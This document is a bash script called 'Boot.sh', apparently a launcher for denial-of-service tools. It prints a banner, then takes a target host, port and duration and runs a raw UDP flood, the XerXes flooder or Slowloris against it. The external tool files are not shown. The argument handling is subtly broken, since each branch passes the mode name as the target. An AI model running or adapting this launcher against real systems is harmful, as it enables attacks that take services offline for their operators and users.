#!/bin/bash

#Colors

# Reset
Color_Off='\033[0m'       # Text Reset
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
# Bold
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BBlue='\033[1;34m'        # Blue
# High Intensity
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IBlue='\033[0;94m'        # Blue
# Bold High Intensity
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIBlue='\033[1;94m'       # Blue

echo -e "${IRed}
 ▄▄▄▄    ▒█████   ▒█████  ▄▄▄█████▓       ██████  ██░ ██ 
▓█████▄ ▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒     ▒██    ▒ ▓██░ ██▒
▒██▒ ▄██▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░     ░ ▓██▄   ▒██▀▀██░
▒██░█▀  ▒██   ██░▒██   ██░░ ▓██▓ ░        ▒   ██▒░▓█ ░██ 
░▓█  ▀█▓░ ████▓▒░░ ████▓▒░  ▒██▒ ░  ██▓ ▒██████▒▒░▓█▒░██▓
░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░    ▒▓▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░     ░     ░▒  ░ ░▒  ░ ░ ▒ ░▒░ ░
 ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░       ░   ░  ░  ░   ░  ░░ ░
 ░          ░ ░      ░ ░             ░        ░   ░  ░  ░
      ░                              ░                   
${Color_Off}"
echo ""
echo -e "${IGreen}Welcome to Boot.sh;"
echo ""
echo -e "Usage Raw UDP: ${Red}./boot.sh rawudp [ip] [port] [time] [size]${IGreen}"
echo -e "Usage XerXes: ${Red}./boot.sh xerxes [hostname] [port]${IGreen}"
echo -e "Usage Slowloris: ${Red}./boot.sh slowloris [hostname] [port] [https or http]${Color_Off}"
echo ""
if [ -z $1 ]
	then
		exit
fi
if [ $1 == 'rawudp' ]
	then
		if [ -z $2 ]
			then
				exit
		fi
		if [ -z $3 ]
			then
				exit
		fi
		if [ -z $4 ]
			then
				exit
		fi
		echo ""
		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
		perl u $1 $2 $3 $4
fi
if [ $1 == 'xerxes' ]
	then
		if [ -z $2 ]
			then
				exit
		fi
		echo ""
		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
		./x $1 $2
fi
if [ $1 == 'slowloris' ]
	then
		if [ -z $2 ]
			then
				exit
		fi
		if [ -z $3 ]
			then
				exit
		fi
		echo ""
		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
		if [ $3 == 'https' ]
			then
				perl s -dns $1 -port $2 -https
		else
			perl s -dns $1 -port $2
		fi
fi
exit
